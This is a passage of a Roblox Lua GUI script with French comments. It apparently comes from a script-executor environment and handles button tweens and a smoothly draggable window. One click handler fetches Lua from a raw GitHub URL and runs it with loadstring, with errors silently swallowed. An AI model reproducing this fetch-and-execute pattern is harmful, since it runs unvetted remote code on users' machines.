	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(TIUEZ_fake_script)()

local function ZPDUF_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[62]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "Youtube copied"
			getgenv().Message = "You copied the Youtube link"
			getgenv().Temps = 3
			getgenv().LD = 3 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
end
coroutine.wrap(ZPDUF_fake_script)()

local function SSVUN_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[64]

	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService") -- Requis pour la fluidité
	
	local boutonDrag = script.Parent
	local guiABouger = boutonDrag.Parent
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	-- Nouvelle variable : la position vers laquelle la fenêtre DOIT aller
	local targetPosition = guiABouger.Position 
	
	-- RÉGLAGE DU STYLE : Plus le chiffre est proche de 0, plus ça "glisse" avec du retard. (ex: 0.1)
	-- Plus le chiffre est proche de 1, plus c'est instantané.
	local vitesseFluidite = 0.30 
	
	-- Fonction qui calcule la destination (mais ne bouge pas encore la fenêtre)
	local function update(input)
		local delta = input.Position - dragStart
	
		-- On met à jour la CIBLE, pas la position réelle
		targetPosition = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X, 
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
	
	-- Quand on clique ou qu'on pose le doigt
	boutonDrag.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiABouger.Position
			targetPosition = guiABouger.Position -- On synchronise au départ
	
			-- Quand on lâche
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Quand on bouge la souris/le doigt PENDANT le clic
	boutonDrag.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Met à jour la cible quand on bouge
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	-- LA MAGIE EST ICI : À chaque image (frame), la fenêtre se rapproche de la cible
	RunService.RenderStepped:Connect(function()
		-- Le Lerp crée ce mouvement élastique/fluide
		guiABouger.Position = guiABouger.Position:Lerp(targetPosition, vitesseFluidite)
	end)
end
coroutine.wrap(SSVUN_fake_script)()


_i[1].Parent = PlayerGui
